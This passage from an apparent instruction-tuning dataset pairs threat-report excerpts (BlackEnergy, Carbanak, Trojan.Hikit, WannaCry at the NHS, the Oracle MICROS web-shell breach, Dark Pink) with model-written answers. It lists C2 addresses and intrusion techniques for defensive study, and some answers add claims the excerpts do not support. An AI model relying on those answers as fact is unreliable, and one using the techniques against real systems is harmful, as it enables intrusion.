(<https://www.flickr.com/photos/tanozzo/4778327737/in/photolist-8hfbmZ-bDuZYz-hDMaip-5VBPny-nTpobM-bjnSt8-obiT2T-6dLNys-ijocCK-b4MfsH-oKUfSr-xmzJEz-kXBnVr-kRUAw-6QwkKt-oaKuyv-itcRjN-5XJ5vs-4NWXby-eqCMfw-Uykkj-ozd6wq-84iqKk-YHqSi-x8SLP-b8Berg-9ZQbLV-kXBhDV-wazGaq-5UGzx1-hJd44C-gtMnyH-rgen12-rK8mhU-aryyDA-9mZLcv-m9CBct-kLyvjg-bf2wBz-8ZAdkB-4MVwFt-arJhqe-dp9nky-dUXpjv-Bd7HW-AXDksz-c3Z5dA-c3Z4Cs-c3Z3GC-c3YZU1>)\u00a9flickr/tanozzo\nAuthor (<http://www.welivesecurity.com/author/acherepanov/>)Anton Cherepanov, ESET\n\nQ: What is the purpose of the 'build_id' value in the BlackEnergy malware configuration, and how can it potentially reveal information about the campaign and targets?",
    "output": "A: The 'build_id' value in the BlackEnergy malware configuration is a unique text string used to identify individual infections or infection attempts by the malware operators. This value can sometimes reveal information about the campaign and targets. For example, build_id values like '2015telsmi', which might contain the Russian acronym SMI (Sredstva Massovoj Informacii), '2015en' for Energy, and 'kiev_o' for Kiev, can provide insights into the specific objectives and geographical focus of the attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Carbanak APT use hooking techniques to compromise the iFOBS banking application?",
    "output": "Hooking is a technique used by adversaries to redirect calls to application programming interface (API) functions for execution and privilege escalation means. In the case of the Carbanak APT, it uses hooking techniques to compromise the iFOBS banking application. Specifically, the malware hooks into the following libraries: VistaDB_D7.bpl, RtlData1.bpl, vcl70.bpl, and RtlStore.bpl. These hooks allow the malware to intercept and manipulate the API calls made by the iFOBS application, enabling the attackers to steal sensitive information such as credit card data. For example, the malware hooks the OpenDatabaseConnection function in the VistaDB_D7.bpl library, which allows it to access the iFOBS database and extract sensitive information. Similarly, the malware hooks the TaskAfterSynchRun function in the RtlData1.bpl library, which enables it to execute malicious code after the iFOBS application has synchronized its data. By using hooking techniques, the Carbanak APT is able to gain control over the iFOBS application and steal sensitive information without being detected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of the RoyalRoad RTF kit and the timing of C&C server responses contribute to the attribution of Sharp Panda to Chinese-based threat groups?",
    "output": "The RoyalRoad RTF kit is a tool commonly used by Chinese APT groups, indicating that the threat actors are familiar with the cybersecurity practices of their targets. Additionally, the C&C servers consistently return payloads only between 01:00 \u2013 08:00 UTC Monday-Friday, which aligns with the typical working hours in China. Furthermore, the C&C servers did not return payloads during the Chinese Spring Festival, even during working hours, providing strong evidence that the threat actors operate within the Chinese time zone and observe Chinese holidays.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.3.2 Technical Sophistication Multiplier\nWhile the previous analysis is useful for understanding the nature of threats, we also score threats numerically to aid in understanding the relative technical sophistication of their approaches. Each malware sample is assigned one of the following values:\n1 Not Protected - The sample contains no code protec-\ntion such as packing, obfuscation (e.g. simple rotation of interesting or identifying strings), or anti-reversing tricks.\n1.25 Minor Protection - The sample contains a simple method of protection, such as one of the following: code protection using publicly available tools where the reverse method is available, such as UPX packing; simple anti-reversing techniques such as not using import tables, or a call to IsDebuggerPresent(); self-disabling in the presence of AV software.\n1.5 Multiple Minor Protection Techniques - The sample contains multiple distinct minor code protection techniques (anti-reversing tricks, packing, VM / reversing tools detection) that require some low-level knowledge. This level includes malware where code that contains the core functionality of the program is decrypted only in memory.\n1.75 Advanced Protection - The sample contains minor code protection techniques along with at least one advanced protection method such as rootkit functionality or a custom virtualized packer.\n2 Multiple Advanced Protection Techniques - The sample contains multiple distinct advanced protection techniques, e.g. rootkit capability, virtualized packer, multiple anti-reversing techniques, and is clearly designed by a professional software engineering team.\nThe purpose of the technical sophistication multiplier is to measure how well the payload of the malware can conceal its presence on a compromised machine. We use a multiplier because advanced malware requires significantly more time and effort (or money, in the case of commercial solutions) to customize for a particular target.\nWe focus on the level of obfuscation used to hide program functionality and avoid detection for the following reasons: (1) It allows the compromised system to remain infected for a longer period; (2) it hinders analysts from dissecting a sample and developing instructions to detect the malware and disinfect a compromised system; (3) since most common used remote access tro-jans (RATs) have the same core functionality (e.g. key-logging, running commands, exfiltrating data, controlling microphones and webcams, etc.) the level of obfuscation used to conceal what the malware is doing can be used to distinguish one RAT from another.\nQ: Why is it important to focus on the level of obfuscation used in malware when assessing its technical sophistication? Discuss the three main reasons provided in the APT report and explain how they contribute to the overall threat assessment.",
    "output": "Focusing on the level of obfuscation used in malware is important when assessing its technical sophistication for several reasons:\\n\\n1. It allows the compromised system to remain infected for a longer period - Higher levels of obfuscation make it harder for security tools and analysts to detect the malware, enabling it to stay active on the compromised system without being noticed.\\n\\n2. It hinders analysts from dissecting a sample and developing instructions to detect the malware and disinfect a compromised system - Obfuscation techniques make it more challenging for analysts to understand the malware's functionality and develop effective countermeasures. This delay in analysis gives the malware more time to operate undetected.\\n\\n3. Since most commonly used remote access trojans (RATs) have the same core functionality, the level of obfuscation used to conceal what the malware is doing can be used to distinguish one RAT from another - Many RATs share similar capabilities like key-logging, running commands, exfiltrating data, and controlling microphones and webcams. The level of obfuscation becomes a critical factor in identifying and differentiating between various RATs, helping analysts to better understand the specific threat they are dealing with.\\n\\nThese reasons contribute to the overall threat assessment by providing insights into the malware's ability to evade detection, the difficulty of analyzing and mitigating the threat, and the specific characteristics that distinguish it from other malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the significance of the MPKBot IRC bot in relation to the Magic Hound campaign, and how is it related to the Rocket Kitten adversary group?",
    "output": "The MPKBot IRC bot is significant because it was found using the same IP for its C2 server as a Leash sample, indicating a possible link between the two. This MPK IRC bot is very similar to the MPK Trojan associated with the Rocket Kitten adversary group. Both versions of the MPK Trojan share considerable similarities in behavior and direct code overlap, suggesting that they are based on the same code base. This relationship highlights the potential connection between the Magic Hound campaign and the Rocket Kitten adversary group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.2.1 ECAT Analysis \u2013 System XX132\nECAT\t\n  contains a\t\n  set of filters and IOCs\t\n  that highlight files of\t\n  interest based\t\n  purely on\t\n  behavioral characteristics such as how they are loaded\t\n  or where they are located. One of these filters is the \"Reserved Filename\", which displays any files that\t\n  have reserved names and are not\t\n  in their\t\n  default\t\n  location. The list\t\n  of\t\n  Reserved Filenames includes both common Windows file system names such as\t\n  svchost.exe, explorer.exe, etc, as well as the\t\n  names of common applications such as browser executables. In the\t\n  example\t\n  depicted in Figure\t\n  5 below, ECAT\t\n  indicated that\t\n  a file named\t\n  svchost.exe (which natively resides under\t\n  c:\\Windows\\system32\\ folder)\t\n  is suspicious due\t\n  to its unexpected location.\nAnother very\t\n \u00a0useful feature of\t\n \u00a0ECAT is the ability to triage a system by downloading a system's Master\t\n \u00a0File Table (MFT)\t\n \u00a0directly from ECAT's console,\t\n \u00a0swiftly allowing\t\n \u00a0the\t\n \u00a0ECAT\t\n \u00a0analyst to triage\t\n \u00a0a\t\n \u00a0system remotely without interfering\t\n \u00a0with the end user's usage of the system. The built-\u00ad\u2010in ECAT MFT Viewer displays all relevant NTFS\t\n \u00a0attributes including all 8\t\n \u00a0NTFS\t\n \u00a0time\t\n \u00a0stamps3 .\t\n \u00a0Frequently, modern APT Trojans time stomp\t\n \u00a0their files to\t\n \u00a0avoid\t\n \u00a0suspicion, so\t\n \u00a0seeing all 8 time stamps is critical in determining when something malicious occurred as well as finding other\t\n \u00a0related events.\nWithin a few seconds after requesting the MFT the analyst was able\t\n  to perform time\t\n  analysis on the\t\n  system. This process started\t\n  with\t\n  events that occurred\t\n  around\t\n  the time when\t\n  the known\t\n  malicious file named\t\n  svchost.exe was created. This\t\n  analysis\t\n  revealed another related file named svchost.conf,\t\n  which was\t\n  determined to be this Trojan's\t\n  obfuscated\t\n  configuration\t\n  file.\n2 Throughout this report some or all of the letters \t\n  in \t\n  the \t\n  names \t\n  of \t\n  the \t\n  systems \t\n  have \t\n  been \t\n  obfuscated \t\n  to \t\n  protect \t\n  the \t\n  identity \t\n  of \t\n  our\t\n  client.\n3 Four time stamps come from the $STANDARD_INFORMATION ($SI) attribute, whereas the other four come from the $FILENAME_INFORMATION ($FN)\t\n  attribute\nThe configuration file (svchost.conf) is \t\n  obfuscated \t\n  with \t\n  a \t\n  4 \t\n  byte \t\n  XOR \t\n  key \t\n  (0xFA274BCD) \t\n  and \t\n  contains \t\n  C2 \t\n  IP \t\n  address 206.205.82.9.\t\n  These two malicious files are components of what RSA IR refers to as Trojan.Hikit:\nFrom the\t\n  created timestamp of svchost.conf, the\t\n  analyst deduced that svchost.exe was executed via a scheduled job, and it dropped svchost.conf. Malware analysis on svchost.exe confirmed this behavior. Typically, when two or more files are created in such proximity in time to each other, and at\t\n  least\t\n  one of\t\n  them has \"00\" for\t\n  the seconds, this\t\n  is\t\n  indicative of this file being executed via a scheduled job.\t\n  This is because when\t\n  scheduling an\t\n  \"at\" job\t\n  the user\t\n  only specifies\t\n  an hour and minute, thus a\t\n  job is executed as soon as the\t\n  specified minute\t\n  arrives, and the seconds\t\n  end up being \"00\".\nIn this case it is highly likely that file svchost.exe was laterally copied over to this system,\t\n  followed by remotely scheduling an \"at\" job to execute that file4 .\t\n \u00a0The job was executed about 1 minute later, and it resulted in the dropping of file svchost.conf. The\t\n \u00a0fact that another local system was involved to infect system XX13\t\n \u00a0was\t\n \u00a0important because it showed that\t\n \u00a0at\t\n \u00a0least\t\n \u00a0one other\t\n \u00a0system on the network was\t\n \u00a0compromised. A quick check of the C:\\Windows\\Tasks folder did not show any leftover At.job files, whereas the entries on SchedLgU.txt file had already rolled into 2013. Furthermore, the Windows Security Event\t\n \u00a0logs, which would typically contain logs\t\n \u00a0on which account and from which system the\t\n \u00a0lateral movement occurred, had also rolled. Lastly, this was a Windows XP system and so their\t\n \u00a0event log Microsoft-\u00ad\u2010Windows-\u00ad\u2010TaskSchedules%4Operational.evtx did\t\n \u00a0not exist,\t\n \u00a0which is typically another great evidence\t\n \u00a0source for lateral\t\n \u00a0movement.\nThe analyst blacklisted file svchost.exe by\t\n  its MD5 hash in ECAT so that if it were encountered again it would be marked as malicious. However, as it is very\t\n  common with many\t\n  Trojans deployed\t\n  on\t\n  a network, at least some of them will vary slightly from others and have\t\n  a\t\n  different hash value\t\n  since at a minimum they are probably configured\t\n  to beacon to different\t\n  C2 channels or\t\n  compiled at\t\n  a different\t\n  time. This is where another\t\n  great\t\n  feature of\t\n  ECAT is very\t\n  useful, namely\t\n  ECAT's ability\t\n  to ingest YARA signatures. This feature also helps immediately mark \"suspicious\" files as \"malicious\". So, it\t\n  is common practice for\t\n  RSA IR analysts to create Yara signatures for\t\n  newly discovered malicious files. Figure\t\n  8\t\n  provides a signature for Trojan.Hikit:\n4 While we have seen adversaries locally schedule a job to execute a file on the local system, this is not very common although worth keeping in mind.\nSmall Headline: 4.2.2 ECAT Analysis \u2013 System XXDEV3\nOn a\t\n  second host (XXDEV3)\t\n  of the eight systems where ECAT was deployed, ECAT\t\n  discovered a\t\n  second instance of Trojan.Hikit.\t\n  The Yara rule had already marked the\t\n  file\t\n  as malicious (i.e. blacklisted it).\nWhen the analyst triaged XXDEV3, two Trojan.Hikit\t\n  configuration files were found. Furthermore, while this example of Trojan.Hitkit appeared to have\t\n  been on the\t\n  system since 2012, the two configuration files\t\n  were created in 2013, as\t\n  shown below:\nBoth configuration \t\n \u00a0files\t\n \u00a0were obfuscated with a 4-\u00ad\u2010byte XOR\t\n \u00a0key similar to the example\t\n \u00a0from XX13.\t\n \u00a0The same \t\n \u00a0C2 \t\n \u00a0node was found in both configuration files:\t\n \u00a0drometic.suroot.com (200.108.192.31).\t\n \u00a0The analyst also found three \"at\" job files that\t\n \u00a0fortunately weren't deleted\t\n \u00a0after execution, as shown\t\n \u00a0below:\nAt this point the analyst\t\n  had three relevant\t\n  timestamps to perform time analysis on. After sorting all the entries in\t\n  the MFT based on the $FN timestamp,\t\n  the \t\n  analyst \t\n  discovered \t\n  the following relevant\t\n  activity:\n1. A\t\n  few seconds after file netddesrv.exe was created\t\n  on\t\n  the system a job\t\n  was scheduled\t\n  (At1.job). This job\t\n  file executed a\t\n  file\t\n  named log.bat, which was no longer present on the system, which executed5 netddesrv.exe in\t\n  return. This proved to be a\t\n  classic example\t\n  of lateral movement.\n2. Looking\t\n  at the\t\n  next scheduled\t\n  job\t\n  the analyst discovered\t\n  artifacts that were different from what had\t\n  been\t\n  encountered up to that point, namely two\t\n  new files appeared\t\n  after a scheduled\t\n  job\t\n  was executed.\nThe scheduled job At2.job\t\n  executed\t\n  c:\\set.exe (no longer present on the system), which dropped files\t\n  frtest.dat\t\n  and Windows Config.wav6 . The last two files were components of what RSA IR refers to as Trojan.FF-\u00ad\u2010RAT. It was unclear at that point whether this Trojan was from a\t\n \u00a0different APT\t\n \u00a0group or if the same APT group that\t\n \u00a0entrenched itself in this system in August 2012, decided\t\n \u00a0to\t\n \u00a0drop\t\n \u00a0a second\t\n \u00a0type of Trojan\t\n \u00a0in\t\n \u00a0this system. Another interesting finding about Trojan.FF-\u00ad\u2010RAT was that file frtest.dat was legitimately digitally signed (as of\t\n \u00a0the time of\t\n \u00a0the engagement):\nDigitally signed malware is rare, \t\n  and \t\n  implies a\t\n  higher level of sophistication from \t\n  an adversary. The file Windows Config.wav file was compressed and contained the Trojan's configuration information, including the C2 domain and its project name. Malware analysis showed that the configuration file of this\t\n  Trojan contained two C2 domain\t\n  names, which\t\n  both\t\n  resolved\t\n  to\t\n  the same IP at that time: mno80.dwy.cc and mno995.dwy.cc (198.55.120.222).\nRSA\t\n  created\t\n  a YARA signature for this new Trojan\t\n  based on\t\n  a unique decompression\t\n  algorithm that\t\n  the Trojan utilized:\n3. The third job file \"At3.job\" also executed a\t\n  file named log.bat (no longer\t\n  present on the\t\n  system), however there\t\n  is \t\n  nothing \t\n  else \t\n  relevant \t\n  around \t\n  this \t\n  time:\n5 This assumption is probably true because throughout this case we saw\t\n  the adversary execute files via batch files such as in this instance.\n6 Notice the \"00\" on\t\n  the seconds for the creation\t\n  time. If the At2.job\t\n  had\t\n  not existed\t\n  or the SchedLgU.txt file does not contain \t\n  any \t\n  evidence \t\n  of \t\n  scheduled \t\n  \"at\" \t\n  jobs, you could infer that the Trojan\t\n  was dropped\t\n  via lateral movement, by looking the \"00\" seconds in\t\n  the creation\t\n  time of the malicious file(s).\nSince\t\n  ECAT\t\n  was only deployed to eight systems\t\n  at this\t\n  point, Security Analytics\t\n  complimented this\t\n  gap in endpoint visibility\t\n  by providing network visibility. A\t\n  quick lookup\t\n  of IP address 198.55.120.222 shows that 14\t\n  internal\t\n  systems are\t\n  beaconing\t\n  out to that IP\t\n  address, and there are several other domain names\t\n  also involved:\nAfter presenting these findings to CompanyA,\t\n \u00a0ECAT agents were deployed to every Windows system on the network. This \t\n \u00a0is \t\n \u00a0where \t\n \u00a0ECAT\t\n \u00a0also \t\n \u00a0compliments \t\n \u00a0SA; several of the discovered\t\n \u00a0Trojans \t\n \u00a0were \t\n \u00a0set \t\n \u00a0to \t\n \u00a0sleep longer than others, were not actively running, or\t\n \u00a0the system was previously infected with Trojan.FF-\u00ad\u2010RAT however the Trojan executable files had since been\t\n \u00a0removed.\nECAT\t\n \u00a0uses frequency analysis to give the analyst instant visibility across the environment on\t\n \u00a0any given\t\n \u00a0file. In this case of the Yara signature for Trojan.FF-\u00ad\u2010RAT, ECAT\t\n \u00a0informed the analyst\t\n \u00a0that\t\n \u00a0file frtest.dat (by MD5 hash) also \t\n \u00a0existed on\t\n \u00a05 additional systems.\t\n \u00a0ECAT also informed the analyst\t\n \u00a0how this file was loaded/entrenched, namely via a service name Nwsapagent.\nThe 5\t\n  systems in question are shown below:\nQuestion: What is the significance of the Master File Table (MFT) in ECAT's analysis process, and how does it help in identifying malicious activities?",
    "output": "Answer: The Master File Table (MFT) is crucial in ECAT's analysis process as it allows the analyst to triage a system remotely without interfering with the end user's usage of the system. The built-in ECAT MFT Viewer displays all relevant NTFS attributes including all 8 NTFS time stamps. Frequently, modern APT Trojans time stomp their files to avoid suspicion, so seeing all 8 time stamps is critical in determining when something malicious occurred as well as finding other related events.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Lessons learned\n12 NHS Digital told us that all organisations infected by WannaCry shared the same vulnerability and could have taken relatively simple action to protect themselves. All NHS organisations infected by WannaCry had unpatched or unsupported Windows operating systems so were susceptible to the ransomware. However, whether organisations had patched their systems or not, taking action to manage their firewalls facing the internet would have guarded organisations against infection. NHS Digital told us that the majority of NHS devices infected were unpatched but on supported Microsoft Windows 7 operating systems. Unsupported devices (those on XP) were in the minority of identified issues. NHS Digital has also confirmed that the ransomware spread via the internet, including through the N3 network (the broadband network connecting all NHS sites in England), but that there were no instances of the ransomware spreading via NHSmail (the NHS email system) (paragraphs 1.2, 1.6 and 2.4 to 2.6).\n13 There was no clear relationship between vulnerability to the WannaCry attack and leadership in trusts. We found no clear relationship between trusts infected by WannaCry and the quality of their leadership, as rated by the Care Quality Commission (paragraph 2.8).\n14 The NHS has accepted that there are lessons to learn from WannaCry and is taking action. Lessons identified by the Department and NHS national bodies include the need to:\n\u2022 develop a response plan setting out what the NHS should do in the event of a cyber attack and establish the roles and responsibilities of local and national NHS bodies and the Department;\n\u2022 ensure organisations implement critical CareCERT alerts (emails sent by NHS Digital providing information or requiring action), including applying software patches and keeping anti-virus software up to date;\n\u2022 ensure essential communications are getting through during an attack when systems are down; and\n\u2022 ensure that organisations, boards and their staff are taking the cyber threat seriously, understand the direct risks to front-line services and are working proactively to maximise their resilience and minimise impacts on patient care.\nSince WannaCry, NHS England and NHS Improvement have written to every trust, clinical commissioning group and commissioning support unit asking boards to ensure that they have implemented all 39 CareCERT alerts issued by NHS Digital between March and May 2017 and taken essential action to secure local firewalls (paragraphs 3.8 and 3.9).\n\nWhat key lessons did the NHS identify from the WannaCry attack, and how are they planning to address these lessons to improve their cybersecurity posture? Discuss the importance of each lesson in the context of future cyber threats.",
    "output": "The NHS identified several key lessons from the WannaCry attack, including the need to develop a response plan for cyber attacks, ensure the implementation of critical CareCERT alerts, maintain essential communications during an attack, and ensure that organizations take the cyber threat seriously. To address these lessons, the NHS is taking action such as writing to every trust, clinical commissioning group, and commissioning support unit to ensure the implementation of all CareCERT alerts and essential actions to secure local firewalls. These measures are crucial for improving the NHS's cybersecurity posture because they enhance preparedness, ensure timely updates and patches, maintain communication channels during crises, and foster a culture of cybersecurity awareness, all of which are vital for mitigating future cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INDICATORS OF COMPROMISE\nIn my original story about the breach, I wasn't able to reveal all the data I'd gathered about the apparent source of the attacks and attackers. A key source in that story asked that I temporarily delay publishing certain details of the investigation, specifically those known as indicators of compromise (IOCs). Basically, IOCs are list of suspect Internet addresses, domain names, filenames and other curious digital clues that are thought to connect the victim with its attacker.\nI've been inundated all week with calls and emails from security experts asking for that very data, but sharing it wasn't my call. That is, until yesterday (8/12/16), when Visa published a \"merchant communication alert\" to some customers. In (PDF), Visa published IOCs that may be connected with the intrusion. These IOCs could be extremely useful to MICROS customers because the presence of Internet traffic to and from these online destinations would strongly suggest the organization's point-of-sale systems may be similarly compromised.\nSome of the addresses on this list from Visa are known to be associated with the Carbanak Gang, a group of Eastern European hackers that Russian security firm Kaspersky Labhas stolen more than $1 billion from banks and retailers. Here's the IOCs list from the alert Visa pushed out Friday:\nVisa warned merchants to check their systems for any communications to and from these Internet addresses and domain names associated with a Russian organized cybercrime gang called \"Carbanak.\"\nThankfully, since at least one of the addresses listed above (192.169.82.86) matched what's on my source's list, the source agreed to let me publish the entire thing. . I checked my source's list and found at least five Internet addresses that were seen in both the Oracle attack and in by ESET Security, a Slovakian antivirus and security company. [NB: If you are unskilled at safely visiting malicious Web sites and/or handling malware, it's probably best not to visit the addresses in the above-linked list.] Visa also mentioned a specific POS-malware threat in its alert called \"MalumPOS.\" According to researchers at Trend Micro, MalumPOS is malware designed to target point-of-sale systems in hotels and related industries. In fact, Trend that MalumPOS is set up to collect data specifically from point-of-sale systems running on Oracle's MICROS platform.\nIt should come as no surprise then that many of Oracle's biggest customers in the hospitality industry are starting to make noise, accusing Oracle of holding back key information that could help MICROS-based companies stop and clean up breaches involving malware and stolen customer credit card data.\nMedium Headline: \"Oracle's silence has been deafening,\" said Michael Blake, chief executive officer at HTNG, a trade association for hotels and technology.\n\"Oracle's silence has been deafening,\" said Michael Blake, chief executive officer at , a trade association for hotels and technology. \"They are still grappling and trying to answer questions on the extent of the breach. Oracle has been invited to the last three [industry] calls this week and they are still going about trying to reach each customer individually and in the process of doing so they have done nothing but given the lame advice of changing passwords.\" The hospitality industry has been particularly hard hit by point-of-sale compromises over the past two years. Last month, KrebsOnSecurity broke the news of (Kimpton appears to run MICROS products, but the company declined to answer questions for this story).\nKimpton joins a long list of hotel brands that have acknowledged card breaches over the last year, including (), , , and (), and . In many of those incidents, thieves had planted malicious software on the point-of-sale devices at restaurants and bars inside of the hotel chains. And, no doubt, many of those cash registers were run on MICROS systems.\nIf Oracle doesn't exactly know which \u2014 if any \u2014 of its MICROS customers had malware on their point-of-sale systems as a result of the breach, it may be because the network intruders didn't have any reason to interact with Oracle's customers via the MICROS portal after stealing usernames and passwords that would allow them to remotely access customer on-premises systems. In theory, at that point the fraudsters could have bypassed Oracle altogether from then on.\nBig Headline: BREACHED BY MULTIPLE ACTORS?\nAnother possibly interesting development in the Oracle breach story: There are indications that Oracle may have been breached by more than one cybercrime group. Or at least handed off from one to the other.\nLate this week, Thomas Fox-Brewster at Forbes noting that MICROS was just one of at least five point-of-sale companies that were recently hacked by a guy who \u2014 from an exhaustive review of his online chats \u2014 appears to have just sat himself down one day and decided to hack a bunch of point-of-sale companies.\nForbes quoted my old friend Alex Holden of saying he had evidence that hackers had breached at least 10 payment companies, and the story focuses on getting confirmation from the various other providers apparently breached by the same cybercriminal actor.\nHolden showed me multiple pages worth of chat logs between two individuals on a cybercrime forum [full disclosure: Holden's company lists me as an adviser, but I accept no compensation for that role, and he ignores most of my advice].\nThe discussion between the two hackers begins around July 15, 2016, and goes on for more than a week. In it, the two hackers have been introduced to one another through a mutual, trusted contact. For a while, all they discuss is whether the seller can be trusted to deliver the Oracle MICROS database and control over the Oracle MICROS customer ticketing portal.\nIn the end, the buyer is convinced by what he sees and agrees to pay the bitcoin equivalent of roughly USD $13,000 for access to Oracle's MICROS portal, as well as a handful of other point-of-sale Web sites. The buyer's bitcoin wallet and the associated transactions can be seen .\nA screen shot shared by one of the hackers involved in compromising Oracle's MICROS support portal. This\nscreen shot was taken of a similar Web shell the hackers placed on the Web site of another POS provider (this is not the shell that was on Oracle).\nAccording to the chat log, the hacker broke in by exploiting a file-upload function built into the MICROS customer support portal. From there the attackers were able to upload an attack tool known as a \".\" This is a crude but effective text-based control panel that helps the attacker install additional attack tools to harvest data from the compromised Web server (see screen shot above). The beauty of a Web shell is that the attacker can control the infected site using nothing more than a Web browser, using nothing more than a hidden login page and a password that only he knows.\nThe two hackers discussed and both viewed more than that were apparently left behind on the MICROS portal by the WSO shell they uploaded in mid-July (most of the malicious files ended in the file extension \"wso.aspx\"). The chat logs show the pair of miscreants proceeding to target another 9 online payment providers or point-of-sale vendors. Some of those companies were quoted in the Forbes piece having acknowledged a breach similar to the Web shell attack at Oracle. But none of them have anywhere near the size of Oracle's MICROS customer base.\nRead the text above and answer this question: Why might Oracle have difficulty determining the extent of the breach affecting its MICROS customers, and what implications does this have for affected organizations?",
    "output": "Oracle may have difficulty determining the extent of the breach affecting its MICROS customers because the network intruders might not have interacted with Oracle's customers via the MICROS portal after stealing usernames and passwords. Once the attackers obtained credentials that allowed them to remotely access customer on-premises systems, they could have bypassed Oracle altogether from then on. This means that Oracle might not have direct visibility into which customers were affected. The implications for affected organizations include potential delays in identifying and remediating breaches, as well as increased risk of further data theft and financial loss.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nCountries of the Asia-Pacific region have long been the target of advanced persistent threat (APT) groups. (<https://explore.group-ib.com/htct/hi-tech_crime_2020#page=1>)Earlier Group-IB research found that this region has often been a \"key arena\" of APT activity, and a mixture of nation-state threat actors from China, North Korea, Iran, and Pakistan have been tied to a wave of attacks in the region. More often than not, the primary motive for APT attacks in the Asia-Pacific (APAC) region is not financial gain, but rather espionage.\nGroup-IB continuously explores and analyzes the methods, tools, and tactics used by some of the world's most prominent APT groups, such as (<https://www.group-ib.com/blog/apt41-world-tour-2021/>)APT41, but how can large-scale companies and organizations protect themselves when a new APT group emerges, or, if an already existing APT group begins to utilize a completely new toolkit. Enter Dark Pink.\nDark Pink is the name given by Group-IB to a new wave of APT attacks that has struck the APAC region. At the present time, Group-IB cannot attribute the campaign to any known threat actor, making it highly likely that Dark Pink is an entirely new APT group. Bearing this in mind, we will refer to Dark Pink as an APT group throughout the entirety of this text. The name Dark Pink was coined by forming a hybrid of some of the email addresses used by the threat actors during data exfiltration. The APT group has also been termed (<https://mp.weixin.qq.com/s/G3gUjg9WC96NW4cRPww6gw>)Saaiwc Group by Chinese cybersecurity researchers.\nThere is evidence to suggest that Dark Pink began operations as early as mid-2021, although (<https://www.group-ib.com/products/threat-intelligence/>)the group's activity surged in mid-to-late 2022. To date, Group-IB's sector-leading Threat Intelligence uncovered seven confirmed attacks by Dark Pink. The bulk of the attacks were carried out against countries in the APAC region, although the threat actors spread their wings and targeted one European governmental ministry. The confirmed victims include two military bodies in the Philippines and Malaysia, government agencies in Cambodia, Indonesia and Bosnia and Herzegovina, and a religious organization in Vietnam. Group-IB also became aware of an unsuccessful attack on a European state development agency based in Vietnam. In line with Group-IB's zero tolerance\npolicy to cybercrime, confirmed and potential victims of Dark Pink were issued proactive notifications, and we note that the list of companies breached by this particular APT group is likely to be longer.\nGroup-IB's early research into Dark Pink has revealed that these threat actors are leveraging a new set of tactics, techniques, and procedures rarely utilized by previously known APT groups. They leverage a custom toolkit, featuring TelePowerBot, KamiKakaBot, and Cucky and Ctealer information stealers (all names dubbed by Group-IB) with the aim of stealing confidential documentation held on the networks of government and military organizations. Of particular note is Dark Pink's ability to infect even the USB devices attached to compromised computers, and also its ability to gain access to messengers on (<https://attack.mitre.org/techniques/T1574/002/>)infected machines. Furthermore, Dark Pink threat actors utilize two core techniques: Side-Loading and executing malicious content triggered by a file type association ((<https://attack.mitre.org/techniques/T1546/001/>)Event Triggered Execution: Change Default File Association). The latter of these tactics is one rarely seen utilized in the wild by threat actors.\nAt the time of writing, Dark Pink is still active. Given the fact that many of the attacks identified by Group-IB researchers took place in the final months of 2022, Group-IB researchers are still in the process of identifying the full scope of the APT attack, and efforts to uncover the origin of this APT group are in process. However, we believe that this preliminary research, which will be of great interest to CISO, heads of cybersecurity teams, SOC analysts and incident response specialists, will go a long way to raising awareness of the new TTPs utilized by this threat actor and help organizations to take the relevant steps to protect themselves from a potentially devastating APT attack.\nAnswer this question: What are the primary targets of the Dark Pink APT group, and what is the most likely motive behind their attacks? How can understanding these factors help organizations better prepare for and respond to similar threats?",
    "output": "The primary targets of the Dark Pink APT group are government and military organizations, as well as religious entities, primarily within the Asia-Pacific (APAC) region, although they have also targeted a European governmental ministry. The most likely motive behind their attacks is espionage rather than financial gain. Understanding these factors helps organizations better prepare by focusing on securing sensitive information and critical infrastructure. It also underscores the importance of robust monitoring and incident response plans tailored to detect and mitigate espionage-related activities. This knowledge allows organizations to allocate resources effectively and implement targeted defense mechanisms, such as enhanced network segmentation and advanced threat intelligence capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: About Lookout\nLookout is a cybersecurity company for a world run by apps. Powered by the largest dataset of mobile code in existence, Lookout is the security platform of record for mobile device integrity and data access. Lookout is trusted by hundreds of millions of individuals, hundreds of enterprises and government agencies, and such ecosystem partners as AT&T, Deutsche Telekom, and Microsoft. Headquartered in San Francisco, Lookout has offices in Amsterdam, Boston, London, Sydney, Tokyo, Toronto and Washington, D.C.\nSmall Headline: Contributors\nAndrew Blaich, Lookout\nApurva Kumar, Lookout\nJeremy Richards, Lookout\nMichael Flossman, Lookout\nCooper Quintin, EFF\nEva Galperin, EFF\nSpecial thanks to the many others in our organization, and to our partners, who contributed significantly to this work.\n1-888-988-5795   |   lookout.com\n\u00a9 2018 Lookout, Inc. LOOKOUT\u00ae, the Lookout Shield Design\u00ae, LOOKOUT with Shield Design\u00ae, SCREAM\u00ae, and SIGNAL FLARE\u00ae are registered trademarks of Lookout, Inc. in the United States and other countries. EVERYTHING IS OK\u00ae, LOOKOUT MOBILE SECURITY\u00ae, and PROTECTED BY LOOKOUT\u00ae, are registered trademarks of Lookout, Inc. in the United States. POWERED BY LOOKOUT\u2122 is a trademark of Lookout, Inc. All other brand and product names are trademarks or registered trademarks of their respective holders. 20180118-Lookout-USv1.0\n\nBased on the above text, answer a question. How does Lookout leverage its extensive dataset to enhance mobile security, and what role does this play in identifying and mitigating threats posed by advanced persistent threats (APTs) like Dark Caracal?",
